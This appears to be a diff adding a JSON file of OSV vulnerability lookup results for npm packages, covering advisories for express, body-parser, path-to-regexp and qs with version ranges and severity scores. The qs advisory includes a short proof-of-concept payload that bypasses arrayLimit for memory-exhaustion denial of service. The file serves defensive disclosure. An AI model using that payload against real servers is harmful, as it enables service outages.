+            "ecosystem": "npm",
+            "name": "express",
+            "purl": "pkg:npm/express"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "4.20.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-qw6h-vgh9-j6wx/GHSA-qw6h-vgh9-j6wx.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "express",
+            "purl": "pkg:npm/express"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "5.0.0-alpha.1"
+                },
+                {
+                  "fixed": "5.0.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-43796"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-79"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-09-10T19:41:04Z",
+        "nvd_published_at": "2024-09-10T15:15:17Z",
+        "severity": "LOW"
+      },
+      "details": "### Impact\n\nIn express <4.20.0, passing untrusted user input - even after sanitizing it - to `response.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in express 4.20.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template\n",
+      "id": "GHSA-qw6h-vgh9-j6wx",
+      "modified": "2026-09-10T03:50:18.298562940Z",
+      "published": "2024-09-10T19:41:04Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/express/security/advisories/GHSA-qw6h-vgh9-j6wx"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43796"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/express/commit/54271f69b511fea198471e6ff3400ab805d6b553"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/expressjs/express"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:L",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "express vulnerable to XSS via response.redirect()"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-qwcr-r2fm-qrc7/GHSA-qwcr-r2fm-qrc7.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "body-parser",
+            "purl": "pkg:npm/body-parser"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.20.3"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-45590"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-405"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-09-10T15:52:39Z",
+        "nvd_published_at": "2024-09-10T16:15:21Z",
+        "severity": "HIGH"
+      },
+      "details": "### Impact\n\nbody-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.\n\n### Patches\n\nthis issue is patched in 1.20.3\n\n### References\n",
+      "id": "GHSA-qwcr-r2fm-qrc7",
+      "modified": "2026-09-10T03:50:18.292199548Z",
+      "published": "2024-09-10T15:52:39Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/security/advisories/GHSA-qwcr-r2fm-qrc7"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45590"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/commit/b2695c4450f06ba3b0ccf48d872a229bb41c9bce"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/expressjs/body-parser"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "body-parser vulnerable to denial of service when url encoding is enabled"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-rhx6-c78j-4q9w/GHSA-rhx6-c78j-4q9w.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "path-to-regexp",
+            "purl": "pkg:npm/path-to-regexp"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.1.12"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-52798"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1333"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-12-05T22:40:47Z",
+        "nvd_published_at": "2024-12-05T23:15:06Z",
+        "severity": "HIGH"
+      },
+      "details": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
+      "id": "GHSA-rhx6-c78j-4q9w",
+      "modified": "2026-09-10T03:50:56.223604407Z",
+      "published": "2024-12-05T22:40:47Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52798"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://blakeembrey.com/posts/2024-09-web-redos"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/pillarjs/path-to-regexp"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20250124-0002"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "type": "CVSS_V3"
+        },
+        {
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
+          "type": "CVSS_V4"
+        }
+      ],
+      "summary": "path-to-regexp contains a ReDoS"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-rv95-896h-c2vc/GHSA-rv95-896h-c2vc.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "express",
+            "purl": "pkg:npm/express"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "4.19.2"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-rv95-896h-c2vc/GHSA-rv95-896h-c2vc.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "express",
+            "purl": "pkg:npm/express"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "5.0.0-alpha.1"
+                },
+                {
+                  "fixed": "5.0.0-beta.3"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2024-29041"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-1286",
+          "CWE-601"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-03-25T19:40:26Z",
+        "nvd_published_at": "2024-03-25T21:15:46Z",
+        "severity": "MODERATE"
+      },
+      "details": "### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### Resources\n\nhttps://github.com/expressjs/express/pull/5539\nhttps://github.com/koajs/koa/issues/1800\nhttps://expressjs.com/en/4x/api.html#res.location",
+      "id": "GHSA-rv95-896h-c2vc",
+      "modified": "2026-09-10T03:50:10.750068508Z",
+      "published": "2024-03-25T19:40:26Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/express/security/advisories/GHSA-rv95-896h-c2vc"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-29041"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/koajs/koa/issues/1800"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/express/pull/5539"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94"
+        },
+        {
+          "type": "WEB",
+          "url": "https://expressjs.com/en/4x/api.html#res.location"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/expressjs/express"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "Express.js Open Redirect in malformed URLs"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v422-hmwv-36x6/GHSA-v422-hmwv-36x6.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "body-parser",
+            "purl": "pkg:npm/body-parser"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.20.6"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        },
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v422-hmwv-36x6/GHSA-v422-hmwv-36x6.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "body-parser",
+            "purl": "pkg:npm/body-parser"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.0.0"
+                },
+                {
+                  "fixed": "2.3.0"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-12590"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-770"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-07-20T23:23:26Z",
+        "nvd_published_at": "2026-07-09T11:16:24Z",
+        "severity": "LOW"
+      },
+      "details": "### Impact\n\nWhen body-parser is configured with an invalid `limit` option value, such as an unparseable string or `NaN`, `bytes.parse()` returns `null` and the request body size check is silently skipped. Applications that rely on `limit` as their primary safeguard against oversized request bodies will accept arbitrarily large payloads, leading to excessive memory and CPU usage and denial of service.\n\nThis issue affects applications that pass a programmatically computed or user-configurable value to the `limit` option without validating it first.\n\n### Patches\n\nThis issue is fixed in [body-parser@2.3.0](https://github.com/expressjs/body-parser/releases/tag/v2.3.0) and [body-parser@1.20.6](https://github.com/expressjs/body-parser/releases/tag/v1.20.6) via [#698](https://github.com/expressjs/body-parser/pull/698). After the fix, invalid `limit` values throw a clear error at parser construction time instead of silently disabling enforcement. `null` and `undefined` continue to fall back to the default limit (`100kb`).\n\n### Workarounds\n\nValidate `limit` before passing it to body-parser. For example, parse the value with [`bytes.parse()`](https://github.com/visionmedia/bytes.js) at startup and reject any configuration where it returns `null` or a non-finite number.\n\n### References\n\n- [#698](https://github.com/expressjs/body-parser/pull/698): fix PR\n- [bytes.js](https://github.com/visionmedia/bytes.js): limit parser",
+      "id": "GHSA-v422-hmwv-36x6",
+      "modified": "2026-09-10T03:50:53.014509971Z",
+      "published": "2026-07-20T23:23:26Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/security/advisories/GHSA-v422-hmwv-36x6"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12590"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/pull/698"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/pull/741"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/commit/2322e111cc321413ec2b7b76d01be533d3de9d7d"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/commit/3492672eee593d5c158f239b6e9115498a5dbeac"
+        },
+        {
+          "type": "WEB",
+          "url": "https://cna.openjsf.org/security-advisories.html"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/expressjs/body-parser"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/releases/tag/1.20.6"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/expressjs/body-parser/releases/tag/v2.3.0"
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "last_known_affected_version_range": "<= 6.14.1",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-w7fw-mjwx-w883/GHSA-w7fw-mjwx-w883.json"
+          },
+          "package": {
+            "ecosystem": "npm",
+            "name": "qs",
+            "purl": "pkg:npm/qs"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "6.7.0"
+                },
+                {
+                  "fixed": "6.14.2"
+                }
+              ],
+              "type": "SEMVER"
+            }
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-2391"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-20"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-02-12T17:04:39Z",
+        "nvd_published_at": "2026-02-12T05:17:11Z",
+        "severity": "LOW"
+      },
+      "details": "### Summary\nThe `arrayLimit` option in qs does not enforce limits for comma-separated values when `comma: true` is enabled, allowing attackers to cause denial-of-service via memory exhaustion. This is a bypass of the array limit enforcement, similar to the bracket notation bypass addressed in GHSA-6rw7-vpxm-498p (CVE-2025-15284).\n\n### Details\nWhen the `comma` option is set to `true` (not the default, but configurable in applications), qs allows parsing comma-separated strings as arrays (e.g., `?param=a,b,c` becomes `['a', 'b', 'c']`). However, the limit check for `arrayLimit` (default: 20) and the optional throwOnLimitExceeded occur after the comma-handling logic in `parseArrayValue`, enabling a bypass. This permits creation of arbitrarily large arrays from a single parameter, leading to excessive memory allocation.\n\n**Vulnerable code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThe `split(',')` returns the array immediately, skipping the subsequent limit check. Downstream merging via `utils.combine` does not prevent allocation, even if it marks overflows for sparse arrays.This discrepancy allows attackers to send a single parameter with millions of commas (e.g., `?param=,,,,,,,,...`), allocating massive arrays in memory without triggering limits. It bypasses the intent of `arrayLimit`, which is enforced correctly for indexed (`a[0]=`) and bracket (`a[]=`) notations (the latter fixed in v6.14.1 per GHSA-6rw7-vpxm-498p).\n\n### PoC\n**Test 1 - Basic bypass:**\n```\nnpm install qs\n```\n\n```js\nconst qs = require('qs');\n\nconst payload = 'a=' + ','.repeat(25);  // 26 elements after split (bypasses arrayLimit: 5)\nconst options = { comma: true, arrayLimit: 5, throwOnLimitExceeded: true };\n\ntry {\n  const result = qs.parse(payload, options);\n  console.log(result.a.length);  // Outputs: 26 (bypass successful)\n} catch (e) {\n  console.log('Limit enforced:', e.message);  // Not thrown\n}\n```\n**Configuration:**\n- `comma: true`\n- `arrayLimit: 5`\n- `throwOnLimitExceeded: true`\n\nExpected: Throws \"Array limit exceeded\" error.\nActual: Parses successfully, creating an array of length 26.\n\n\n### Impact\nDenial of Service (DoS) via memory exhaustion.\n\n### Suggested Fix\nMove the `arrayLimit` check before the comma split in `parseArrayValue`, and enforce it on the resulting array length. Use `currentArrayLength` (already calculated upstream) for consistency with bracket notation fixes.\n\n**Current code** (lib/parse.js: lines ~40-50):\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    return val.split(',');\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\n\n**Fixed code:**\n```js\nif (val && typeof val === 'string' && options.comma && val.indexOf(',') > -1) {\n    const splitArray = val.split(',');\n    if (splitArray.length > options.arrayLimit - currentArrayLength) {  // Check against remaining limit\n        if (options.throwOnLimitExceeded) {\n            throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n        } else {\n            // Optionally convert to object or truncate, per README\n            return splitArray.slice(0, options.arrayLimit - currentArrayLength);\n        }\n    }\n    return splitArray;\n}\n\nif (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n    throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n}\n\nreturn val;\n```\nThis aligns behavior with indexed and bracket notations, reuses `currentArrayLength`, and respects `throwOnLimitExceeded`. Update README to note the consistent enforcement.",
+      "id": "GHSA-w7fw-mjwx-w883",
+      "modified": "2026-09-10T03:50:35.973235487Z",
+      "published": "2026-02-12T17:04:39Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/ljharb/qs/security/advisories/GHSA-w7fw-mjwx-w883"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-2391"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ljharb/qs/commit/f6a7abff1f13d644db9b05fe4f2c98ada6bf8482"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/ljharb/qs"
+        }
+      ],
+      "related": [
+        "CVE-2026-82562"
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "qs's arrayLimit bypass in comma parsing allows denial of service"
+    }
+  ],
+  "exact_version_results": [
+    {
+      "vulns": [
+        {
+          "id": "GHSA-qw6h-vgh9-j6wx",
+          "modified": "2026-09-10T03:50:18.298562Z"
+        },
+        {
+          "id": "GHSA-rv95-896h-c2vc",
+          "modified": "2026-09-10T03:50:10.750068Z"
+        }
+      ]
+    },
+    {},
+    {},
+    {},
+    {},
+    {
+      "vulns": [
+        {
+          "id": "GHSA-qwcr-r2fm-qrc7",
+          "modified": "2026-09-10T03:50:18.292199Z"
+        },
+        {
+          "id": "GHSA-v422-hmwv-36x6",
+          "modified": "2026-09-10T03:50:53.014509Z"
+        }
+      ]
+    },
+    {},
+    {},
+    {},
+    {},
+    {},
+    {
+      "vulns": [
+        {
+          "id": "GHSA-pxg6-pf52-xh8x",
+          "modified": "2026-09-10T03:50:19.898971Z"
+        }
+      ]
+    },
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {
+      "vulns": [
+        {
+          "id": "GHSA-37ch-88jc-xwx2",
+          "modified": "2026-09-10T03:50:36.768786Z"
+        },
+        {
+          "id": "GHSA-9wv6-86v2-598j",
+          "modified": "2026-09-10T03:50:18.832560Z"
+        },
+        {
+          "id": "GHSA-rhx6-c78j-4q9w",
+          "modified": "2026-09-10T03:50:56.223604Z"
+        }
+      ]
+    },
+    {},
+    {
+      "vulns": [
+        {
+          "id": "GHSA-4mjr-xmp4-gh2g",
+          "modified": "2026-09-10T03:51:14.991984Z"
+        },
+        {
+          "id": "GHSA-6rw7-vpxm-498p",
+          "modified": "2026-09-10T03:50:31.670581Z"
+        },
+        {
+          "id": "GHSA-w7fw-mjwx-w883",
+          "modified": "2026-09-10T03:50:35.973235Z"
+        }
+      ]
+    },
+    {},
+    {},
+    {},
+    {},
+    {
+      "vulns": [
+        {
+          "id": "GHSA-m6fv-jmcg-4jfg",
+          "modified": "2026-09-10T03:50:18.939403Z"
+        }
+      ]
+    },
+    {
+      "vulns": [
+        {
+          "id": "GHSA-cm22-4g7w-348p",
+          "modified": "2026-09-10T03:50:18.868190Z"
+        }
+      ]
+    },
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {},
+    {}
+  ],
+  "query_endpoint": "https://api.osv.dev/v1/querybatch",
+  "record_endpoint_template": "https://api.osv.dev/v1/vulns/{id}",
+  "retrieved_at_utc": "2026-09-24T15:56:22.995965+00:00"
+}
